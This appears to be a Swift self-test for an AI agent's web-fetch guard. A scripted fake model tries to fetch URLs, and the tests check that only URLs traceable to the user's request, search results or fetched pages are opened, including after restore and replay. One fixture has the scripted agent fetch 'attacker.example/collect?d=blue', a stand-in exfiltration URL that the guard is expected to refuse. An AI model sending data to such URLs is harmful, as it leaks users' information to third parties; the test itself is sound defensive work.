import ConversationFeature
import ConversationRuntime
import Foundation
import FoundationModels
import Observation
import Synchronization

@MainActor
enum FetchProvenanceSelfTest {
    static func run(_ check: (String, Bool, String) -> Void) async {
        let root = URL.temporaryDirectory.appending(path: "provenance-selftest-" + UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: root) }
        do {
            try await conversation(root, check)
            legacyEvidence(check)
            try await cassettes(root, check)
            try await spellings(root, check)
            try await snippets(check)
        } catch {
            check("provenance/fixture", false, error.localizedDescription)
        }
    }

    private static func conversation(_ root: URL, _ check: (String, Bool, String) -> Void) async throws {
        let start = "https://user.example/start"
        let later = "https://user.example/later"
        let unread = "https://user.example/unread"
        let result = "https://search.example/result"
        let mirror = "https://snippet.example/mirror"
        let next = "https://body.example/next"
        let unfollowed = "https://body.example/unfollowed"
        let leak = "https://attacker.example/collect?d=blue"
        let claim = "https://answer.example/claim"
        let answer = "Blue.\n\nSources:\n\(start)\n\(leak)\n\(claim)"
        func fetch(_ url: String) -> ProvenanceModel.Call {
            ProvenanceModel.Call(name: "fetch_page", arguments: #"{"url":"\#(url)"}"#)
        }
        let model = ProvenanceModel(turns: [
            ProvenanceModel.Turn(
                calls: [ProvenanceModel.Call(name: "web_search", arguments: #"{"query":"provenance fixture"}"#)]
                    + [start, mirror, result, next, leak].map(fetch), answer: answer),
            ProvenanceModel.Turn(calls: [leak, claim].map(fetch), answer: "Blue.\n\nSources:\n\(start)"),
            ProvenanceModel.Turn(calls: [fetch(later)], answer: "Later.\n\nSources:\n\(later)"),
        ])
        let preferences = ConversationPreferences(persists: false)
        preferences.resetForHeadless()
        preferences.citationGuard = true
        preferences.maxSteps = 16
        preferences.notesFolderPath = root.appending(path: "notes").path
        let archive = ConversationArchive(directory: root.appending(path: "conversations"))
        let log = ProvenanceLog()
        let runner = ConversationRunner(
            id: "provenance", chat: ChatViewModel(), preferences: preferences, archive: archive,
            sessionFactory: { tools in LanguageModelSession(model: model, tools: tools.tools(fileOperations: false)) },
            recordsMetrics: false,
            toolExecutor: { call in
                let url = call.value("url") ?? ""
                log.calls.withLock { $0.append(call.name == "fetch_page" ? url : call.name) }
                guard call.name == "fetch_page" else {
                    return AgentToolOutput(
                        text: "1. Result\n   \(result)\n   Mirror at \(mirror)",
                        seen: [result: "Result\nMirror at \(mirror)"])
                }
                let text = url == start ? "Start page. Next: \(next) and \(unfollowed)" : "Page at \(url)"
                return AgentToolOutput(text: text, seen: [url: text], finalURL: url)
            })
        var settings = preferences.settings
        settings.webSearchEnabled = true
        let store = ConversationStore(
            initialState: ConversationState(id: "provenance", now: Date(), mode: .work, settings: settings),
            run: runner.run)
        store.send(
            .send(
                "Compare \(start) with the search results. Keep \(later) and \(unread) for later.", mode: .work,
                now: Date()))
        await idle(store)
        let checks = runner.citationGuard.checks
        let outcome = runner.citationGuard.outcome
        let repairFetches = runner.tools.repairFetches
        store.send(.send("Now read the second page from my first message.", mode: .work, now: Date()))
        await idle(store)

        let attempts = runner.tools.fetchAttempts
        let calls = log.calls.withLock { $0 }
        let opened = attempts.filter(\.ok).map(\.url)
        let refused = attempts.filter { $0.refused == true }.map(\.url)
        let entries = store.state.transcript.entries
        let outputs = entries.compactMap { entry -> String? in
            if case .toolOutput(_, "fetch_page", let text) = entry { text } else { nil }
        }
        let prompts = entries.compactMap { entry -> String? in
            if case .prompt(_, let text) = entry { text } else { nil }
        }
        check(
            "provenance/originsOpen",
            calls == ["web_search", start, mirror, result, next, later]
                && opened == [start, mirror, result, next, later],
            "calls=\(calls) opened=\(opened)")
        check(
            "provenance/unknownURLRefusedBeforeConnecting",
            refused.first == leak && !calls.contains(leak)
                && outputs.count { $0 == ToolRunner.fetchOriginRefusal } == 3 && refused.count == 3,
            "refused=\(refused) outputs=\(outputs)")
        check(
            "provenance/repairPromptAndAnswerURLsRefused",
            checks.first?.unfetched == [leak, claim]
                && prompts.contains(AgentPromptBuilder.repairPrompt(unfetched: [leak, claim]))
                && refused == [leak, leak, claim] && !calls.contains(claim) && outcome == "repaired"
                && repairFetches == 0,
            "unfetched=\(checks.first?.unfetched ?? []) refused=\(refused) outcome=\(outcome ?? "-") "
                + "repairFetches=\(repairFetches)")
        let first = checks.first
        check(
            "provenance/refusedCitationIsUnfetched",
            first?.citationsUnfetched == [leak, claim] && first?.citationsFetched == 1 && first?.citationsFailed == 0
                && first?.reason == "unfetched",
            first?.logLine ?? "no check")

        guard case .snapshot(var saved) = try await archive.load(id: "provenance") else {
            check("provenance/refusalSurvivesRestore", false, "the conversation was not saved")
            return
        }
        saved.instructionsVersion = "cite-fetched-v3"
        saved.toolsVersion = AgentTools.names.dropLast().joined(separator: ",")
        let copies = ConversationArchive(directory: root.appending(path: "restored"))
        try await copies.save(saved, expectedRevision: 0, writer: UUID())
        let restorer = ConversationRunner(
            id: "restorer", chat: ChatViewModel(), preferences: ConversationPreferences(persists: false),
            archive: copies)
        var reopened = false
        await restorer.run(.restore(id: saved.id)) { action in
            if case .archiveRestored(_, .snapshot) = action { reopened = true }
        }
        func verdict(_ tools: ToolRunner) -> LedgerCheck {
            CitationGuard.ledgerCheck(
                stage: "answer", answer: answer, notes: [], ledger: tools.ledger, attempts: tools.fetchAttempts,
                sourcesRequired: nil, usedWebTools: true)
        }
        let probes = [start, result, mirror, next, later, unread, unfollowed, leak, claim]
        let live = probes.map(runner.tools.allowsFetch)
        let restored = probes.map(restorer.tools.allowsFetch)
        check(
            "provenance/refusalSurvivesRestore",
            reopened && restorer.tools.fetchAttempts == attempts && verdict(restorer.tools) == verdict(runner.tools)
                && verdict(restorer.tools).citationsUnfetched == [leak, claim] && restored == live
                && live == [true, true, true, true, true, true, true, false, false],
            "reopened=\(reopened) live=\(live) restored=\(restored) \(verdict(restorer.tools).logLine)")
    }

    private static func legacyEvidence(_ check: (String, Bool, String) -> Void) {
        let gone = "https://example.invalid/gone"
        let saved = #"{"attempts":[{"ok":false,"url":"\#(gone)"}],"pages":[],"seen":{}}"#
        let evidence = try? JSONDecoder().decode(ConversationEvidence.self, from: Data(saved.utf8))
        let tools = ToolRunner(preferences: ConversationPreferences(persists: false))
        if let evidence { tools.restoreEvidence(evidence) }
        let verdict = CitationGuard.ledgerCheck(
            stage: "answer", answer: "Could not read \(gone).", notes: [], ledger: tools.ledger,
            attempts: tools.fetchAttempts, sourcesRequired: nil, usedWebTools: true)
        check(
            "provenance/legacyEvidenceReads",
            evidence?.attempts == [ConversationEvidence.Attempt(url: gone, ok: false)]
                && tools.fetchAttempts == [FetchAttempt(url: gone, ok: false)] && verdict.citationsFailed == 1
                && verdict.citationsUnfetched.isEmpty && !verdict.violation,
            verdict.logLine)
    }

    private static func cassettes(_ root: URL, _ check: (String, Bool, String) -> Void) async throws {
        let url = "https://example.com/p1"
        let tape = root.appending(path: "provenance.jsonl")
        let entry = ToolCassette.Entry(
            key: ["fetch_page", url, ""], text: "page 1", seen: [:], ok: true, finalURL: url, ms: 0, recorded: "t")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let recorded = try JSONEncoder().encode(entry) + Data("\n".utf8)
        try recorded.write(to: tape)
        var results: [String] = []
        for mode in ToolCassette.Mode.allCases {
            let cassette = try ToolCassette(file: tape, mode: mode, replaysLatency: false)
            let preferences = ConversationPreferences(persists: false)
            preferences.notesFolderPath = root.path
            preferences.cassette = cassette
            preferences.replaysRecordedTools = true
            let tools = ToolRunner(preferences: preferences)
            let text = await tools.execute(
                AgentToolCall(name: "fetch_page", arguments: [AgentArgument(name: "url", value: url)]))
            let hits = await cassette.hits
            let refusal = text == ToolRunner.fetchOriginRefusal
            results.append(
                "\(mode.rawValue): \(refusal ? "refused" : text) hits=\(hits) webCalls=\(tools.webToolCalls)")
        }
        check(
            "provenance/replayOnlySkipsTheCheck",
            results == [
                "record: refused hits=0 webCalls=0", "replay: page 1 hits=1 webCalls=1",
                "replay-or-record: refused hits=0 webCalls=0",
            ] && (try? Data(contentsOf: tape)) == recorded,
            results.joined(separator: " | "))
    }

    private static func fetch(_ url: String) -> AgentToolCall {
        AgentToolCall(name: "fetch_page", arguments: [AgentArgument(name: "url", value: url)])
    }

    private static func recording(
        _ log: ProvenanceLog, _ preferences: ConversationPreferences = ConversationPreferences(persists: false),
        search: AgentToolOutput, page: @escaping (String) -> String
    ) -> ToolRunner {
        ToolRunner(
            preferences: preferences,
            executor: { call in
                let url = call.value("url") ?? ""
                log.calls.withLock { $0.append(call.name == "fetch_page" ? url : call.name) }
                guard call.name == "fetch_page" else { return search }
                return AgentToolOutput(text: page(url), seen: [url: page(url)], finalURL: url)
            })
    }

    private static func spellings(_ root: URL, _ check: (String, Bool, String) -> Void) async throws {
        let guide = "https://docs.example/guide"
        let index = "https://docs.example/guide/"
        let escaped = "https://docs.example/caf%C3%A9"
        let request = "Read \(guide) and \(escaped)."
        let leaked = guide + "#leak-blue"
        let search = AgentToolOutput(text: "1. Guide index\n   \(index)", seen: [index: "Guide index"])
        let log = ProvenanceLog()
        let tools = recording(log, search: search) { _ in "Page" }
        tools.requests = [request]
        _ = await tools.execute(
            AgentToolCall(name: "web_search", arguments: [AgentArgument(name: "query", value: "guide")]))
        for url in [
            leaked, "https://DOCS.example/guide", guide + "//", "https://docs.example/caf\u{E9}", escaped, guide, index,
            guide + "#top",
        ] {
            _ = await tools.execute(fetch(url))
        }
        let cited = CitationGuard.ledgerCheck(
            stage: "answer", answer: "Sources:\n" + leaked, notes: [], ledger: tools.ledger,
            attempts: tools.fetchAttempts, sourcesRequired: nil, usedWebTools: true)
        let tape = root.appending(path: "spellings.jsonl")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let lines = try [(guide, "origin page"), (leaked, "variant page")].map { url, text in
            let entry = ToolCassette.Entry(
                key: ["fetch_page", url, ""], text: text, seen: [:], ok: true, finalURL: url, ms: 0, recorded: "t")
            return try JSONEncoder().encode(entry) + Data("\n".utf8)
        }
        try lines.reduce(Data(), +).write(to: tape)
        var cassette: [String] = []
        for mode in [ToolCassette.Mode.record, .replay] {
            let preferences = ConversationPreferences(persists: false)
            preferences.notesFolderPath = root.path
            preferences.cassette = try ToolCassette(file: tape, mode: mode, replaysLatency: false)
            let taped = ToolRunner(preferences: preferences)
            taped.requests = [request]
            cassette.append(mode.rawValue + ": " + (await taped.execute(fetch(leaked))))
        }
        let replayed = ProvenanceLog()
        let rag = ConversationPreferences(persists: false)
        rag.replaysRecordedTools = true
        let evaluation = recording(replayed, rag, search: search) { _ in "Page" }
        _ = await evaluation.execute(fetch(leaked))
        let calls = log.calls.withLock { $0 }
        let ragCalls = replayed.calls.withLock { $0 }
        check(
            "provenance/fetchUsesOriginSpelling",
            calls == ["web_search", guide, guide, guide, escaped, escaped, guide, index, guide]
                && cassette == ["record: origin page", "replay: variant page"] && ragCalls == [leaked]
                && cited.citationsFetched == 1,
            "calls=\(calls) cassette=\(cassette) rag=\(ragCalls) \(cited.logLine)")
    }

    private static func snippets(_ check: (String, Bool, String) -> Void) async throws {
        let result = "https://search.example/a"
        let mirror = "https://snippet.example/b"
        let search = AgentToolOutput(
            text: "1. A\n   \(result)\n   Mirror at \(mirror)", seen: [result: "A\nMirror at \(mirror)"])
        let log = ProvenanceLog()
        func runner() -> ToolRunner { recording(log, search: search) { $0 == result ? "A body" : "Page at " + $0 } }
        func opens(_ tools: ToolRunner) async -> Bool {
            await tools.execute(fetch(mirror)) != ToolRunner.fetchOriginRefusal
        }
        let live = runner()
        _ = await live.execute(
            AgentToolCall(name: "web_search", arguments: [AgentArgument(name: "query", value: "a")]))
        _ = await live.execute(fetch(result))
        let saved = try JSONEncoder().encode(live.evidence)
        let opened = await opens(live)
        let reopened = runner()
        reopened.restoreEvidence(try JSONDecoder().decode(ConversationEvidence.self, from: saved))
        let restored = await opens(reopened)
        check(
            "provenance/snippetURLSurvivesPageFetch", opened && restored,
            "live=\(opened) restored=\(restored) calls=\(log.calls.withLock { $0 })")
        let legacy = runner()
        let old = #"{"attempts":[],"pages":[],"seen":{"\#(result)":"A\nMirror at \#(mirror)"}}"#
        legacy.restoreEvidence(try JSONDecoder().decode(ConversationEvidence.self, from: Data(old.utf8)))
        let derived = legacy.allowsFetch(mirror)
        _ = await legacy.execute(fetch(result))
        let kept = await opens(legacy)
        check(
            "provenance/legacyEvidenceKeepsSnippetURLs", derived && kept,
            "derived=\(derived) kept=\(kept) calls=\(log.calls.withLock { $0 })")
    }

    private static func idle(_ store: ConversationStore) async {
        for await idle in Observations({ !store.state.isRunning && !store.state.isSaving }) where idle { break }
    }
}

private nonisolated final class ProvenanceLog: Sendable {
    let calls = Mutex<[String]>([])
}

private nonisolated struct ProvenanceModel: LanguageModel {
    struct Call: Sendable {
        var name: String
        var arguments: String
    }

    struct Turn: Sendable {
        var calls: [Call]
        var answer: String
    }

    struct Executor: LanguageModelExecutor {
        typealias Model = ProvenanceModel
        init(configuration: UUID) {}

        func respond(
            to request: LanguageModelExecutorGenerationRequest, model: Model,
            streamingInto channel: LanguageModelExecutorGenerationChannel
        ) async throws {
            try Task.checkCancellation()
            let entries = Array(request.transcript)
            let prompts = entries.count { if case .prompt = $0 { true } else { false } }
            let turn = model.turns[max(0, min(prompts, model.turns.count) - 1)]
            let start = entries.lastIndex { if case .prompt = $0 { true } else { false } } ?? 0
            let done = entries.dropFirst(start + 1).count { if case .toolOutput = $0 { true } else { false } }
            guard done < turn.calls.count else {
                await channel.send(.response(action: .appendText(turn.answer, tokenCount: 1)))
                await channel.send(.response(action: .updateMetadata(["stopReason": "stopToken"])))
                return
            }
            let call = turn.calls[done]
            let id = "call-\(entries.count)"
            await channel.send(
                .toolCalls(
                    action: .toolCall(
                        id: id, name: call.name, action: .appendArguments(call.arguments, tokenCount: 1))))
            await channel.send(
                .toolCalls(
                    action: .toolCall(id: id, name: call.name, action: .updateMetadata(["stopReason": "stopToken"]))))
        }
    }

    let turns: [Turn]
    let executorConfiguration = UUID()
    let capabilities = LanguageModelCapabilities([.reasoning, .toolCalling])
}
